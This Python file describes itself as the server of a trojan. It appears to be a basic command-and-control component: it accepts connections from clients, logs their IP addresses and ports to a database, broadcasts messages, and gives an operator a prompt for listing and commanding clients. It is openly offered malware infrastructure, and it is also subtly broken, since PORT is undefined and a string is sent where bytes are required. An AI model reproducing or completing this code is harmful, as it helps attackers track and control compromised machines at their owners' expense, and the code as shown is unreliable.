"""Server of a Trojan."""

from Server.servers import SERVER_LIST, close_all_servers
from Server.config import commands, logger, FORMAT
from Server.data import client_table, db_connection

import threading

from sqlalchemy import text


def broadcast(msg: str) -> None:
    """Broadcast to all"""

    SERVER_LIST["broadcast"].sendto(msg, ('<broadcast>', PORT)) # broadcast on specified port


def handle_new_connection() -> None:
    SERVER_LIST["p2p"].listen()
    while True:
        conn, addr = SERVER_LIST["p2p"].accept()
        with conn:
            print(conn, addr)
            msg = conn.recv(8).decode(FORMAT)
            print(msg)

            ip, port = addr
            ins = client_table.insert().values(ip=ip, port=port)
            db_connection.execute(ins)


def main() -> None:

    while not commands.get((cmd := input("> ").lower()), lambda: False)():
        # ins = client_table.insert().values(ip=cmd, port=4545)
        # result = db_connection.execute(ins)
        # SERVER_LIST["p2p"].sendto(bytes(cmd, FORMAT), (addr, port))
        if cmd == "show":
            t = text("SELECT * FROM client")
            result = db_connection.execute(t).fetchall()
            print(result)


    assert close_all_servers(), "Something went wrong when closing the servers!"


if __name__ == '__main__':
    thread = threading.Thread(target=handle_new_connection)
    thread.daemon = True
    thread.start()

    main()
